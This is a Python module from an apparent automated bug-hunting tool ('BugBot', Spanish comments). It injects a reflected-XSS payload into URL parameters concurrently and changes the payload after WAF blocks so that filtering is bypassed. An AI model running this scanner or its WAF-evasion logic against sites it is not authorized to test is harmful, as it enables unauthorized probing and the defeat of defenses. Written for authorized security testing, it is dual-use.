import asyncio
import aiohttp
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional

from core.config import Config
from core.memory_cortex import MemoryCortex

# Configuración de Logging
logger = Config.setup_logger("BugBot.Injector", "bugbot_injector.log")

class Injector:
    """
    Injector Engine (v1.0):
    - Filtra URLs con parámetros.
    - Inyecta payloads de XSS Reflejado.
    - Verifica la persistencia del payload en la respuesta.
    """

    # Payload seguro para prueba de concepto (Reflected XSS)
    XSS_PAYLOAD = "\"><script>alert('BugBot')</script>"

    def __init__(self, concurrency: int = 20, timeout: int = 10):
        self.semaphore = asyncio.Semaphore(concurrency)
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.brain = MemoryCortex()

    def _get_parameterized_urls(self, urls: List[str]) -> List[str]:
        """Filtra URLs que contienen parámetros de consulta (query strings)."""
        return [url for url in urls if urlparse(url).query]

    async def test_xss(self, session: aiohttp.ClientSession, url: str) -> Optional[Dict]:
        """Inyecta el payload en cada parámetro de la URL y verifica el reflejo."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        domain = parsed.netloc
        origin_url = url
        
        async with self.semaphore:
            # Probamos inyectar en cada parámetro uno por uno
            for param in params:
                test_params = params.copy()
                # 🧠 INTELIGENCIA: Preguntamos al Cerebro si debe mutar este payload por bloqueos previos
                smart_payload = self.brain.get_smart_mutation(domain, param, self.XSS_PAYLOAD)
                test_params[param] = [smart_payload]
                
                # Reconstruir URL con el payload inteligente
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                try:
                    async with session.get(test_url, headers=Config.CUSTOM_HEADERS, timeout=self.timeout) as response:
                        # 💥 WAF DETECTION
                        if response.status in [403, 406, 501, 429]:
                            self.brain.memorize_waf_block(domain, param, self.XSS_PAYLOAD, response.status)
                            continue

                        if response.status == 200:
                            content = await response.text()
                            # Verificación estricta: el payload debe aparecer tal cual en el HTML
                            if smart_payload in content:
                                logger.info(f"[!] VULNERABILIDAD DETECTADA (XSS): {test_url}")
                                return {
                                    "type": "VULNERABLE_XSS",
                                    "url_vulnerable": test_url,
                                    "param": param,
                                    "payload": smart_payload,
                                    "impact": "Reflected XSS - High Risk",
                                    "base_url": origin_url
                                }
                except Exception as e:
                    logger.debug(f"Error inyectando en {test_url}: {e}")
                    
        return None

    async def run(self, urls: List[str]) -> List[Dict]:
        """Orquesta el escaneo de inyección en URLs parametrizadas."""
        target_urls = self._get_parameterized_urls(urls)
        if not target_urls:
            return []

        logger.info(f"[*] Escaneando inyección en {len(target_urls)} URLs con parámetros...")
        
        import sys
        connector = None
        if sys.platform == 'win32':
            resolver = aiohttp.ThreadedResolver()
            connector = aiohttp.TCPConnector(resolver=resolver, use_dns_cache=False)
            
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.test_xss(session, url) for url in target_urls]
            results = await asyncio.gather(*tasks)
            
        findings = [r for r in results if r is not None]
        logger.info(f"[+] Inyección completada. XSS confirmados: {len(findings)}")
        return findings

if __name__ == '__main__':
    # Test simple
    async def test():
        inj = Injector()
        urls = ["http://testphp.vulnweb.com/listproducts.php?cat=1"]
        res = await inj.run(urls)
        print(f"Hallazgos XSS: {res}")
    
    asyncio.run(test())
